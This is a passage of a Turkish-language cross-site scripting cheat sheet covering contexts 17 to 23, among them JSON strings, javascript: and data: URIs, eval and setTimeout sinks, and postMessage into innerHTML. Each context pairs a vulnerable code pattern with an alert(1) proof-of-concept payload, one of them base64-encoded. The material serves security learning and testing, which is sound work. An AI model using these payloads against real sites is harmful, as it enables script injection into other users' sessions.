<h1>CONTEXTS</h1>
<br>

<h2>🔹 17. JavaScript Object Context (JSON gibi)</h2>
<h4>Input, JSON string içinde gömülür ama frontend tarafı JS olarak parse edip kullanıyorsa,<br>
input içindeki kaçış karakterleri doğru işlenmezse JS kodu enjeksiyonu olur.

</h4><br>

📌 Örnek:  
`{"name":"PAYLOAD"}`  
<br>
🎯 Exploit:  
```html
\";alert(1);//
```
<br>



<h2>🔹 18. JavaScript URI inside - form / object / embed</h2>
<h4>form action, object data veya embed src attribute’larına javascript:<br>
veya data URI konursa, input kontrolsüzse XSS oluşabilir.
</h4><br>

📌 Örnek:  
`<form action="javascript:alert(1)">`  
veya  
`<embed src="data:text/html;base64,...">`
<br>

🎯 Exploit:  
```html
javascript:alert(1)
```
<br> 



<h2>🔹 19. Base64 / Data URI Context</h2>
<h4>Bazı yerlerde data: URI’leriyle (örneğin iframe src="data:text/html,...") XSS yapılabilir.<br>
Input bu URI içine konulursa ve sanitize edilmezse JS kodu çalışır.</h4><br>

📌 Örnek:  
`<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>`  
<br>
🎯 Exploit:  
```html
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```
veya
```html
data:text/html,<script>alert(1)</script>
```

<br>


<h2>🔹 20. XHR / Fetch Injection via DOM Sinks</h2>
<h4>JavaScript’in fetch(), XMLHttpRequest(), eval() gibi fonksiyonlarına input doğrudan veriliyorsa,<br>
kötü amaçlı inputla XSS tetiklenebilir. Özellikle eval() çok tehlikelidir.</h4><br>

📌 Örnek:  
`eval(location.hash.substring(1))`
<br>  
🎯 Exploit:  
```bash
http://site.com/#alert(1)
```
<br>



<h2>🔹 21. WebSocket / PostMessage / Custom Protocol Context</h2>
<h4>WebSocket veya postMessage gibi API’ler ile client’a veri yansıtılıyorsa ve bu veriler<br>
DOM’a yazılıyorsa, kontrolsüz inputla XSS çıkabilir.</h4><br>

📌 Örnek:  
```js
window.addEventListener("message", e => {
  document.body.innerHTML = e.data;
});
```
<br>

🎯 Exploit:  
```html
<img src=x onerror=alert(1)>
```
<br>



<h2>🔹 22. Script src dynamically built</h2>
<h4>JavaScript kodunda script tag’i oluşturulup src attribute’u dinamik olarak inputla set ediliyorsa,<br>
input doğru kontrol edilmezse, dışardan kötü amaçlı script çağrısı yapılabilir.

</h4>
  <br>

📌 Örnek:  
```js
var script = document.createElement("script");
script.src = "/api/" + userInput;
document.body.appendChild(script);
```
<br>
🎯 Exploit:  

```html
";alert(1)//
```
<br>



<h2>🔹 23. SetTimeout / setInterval / Function constructor</h2>
<h4>Input, setTimeout/setInterval veya Function constructor parametresi olarak kullanılırsa,<br>
doğrudan JS kodu olarak çalıştırılabilir ve XSS olabilir.</h4><br>

📌 Örnek:  
`setTimeout(userInput, 1000)`  
<br>
🎯 Exploit:  
```js
alert(1)
```
<br>
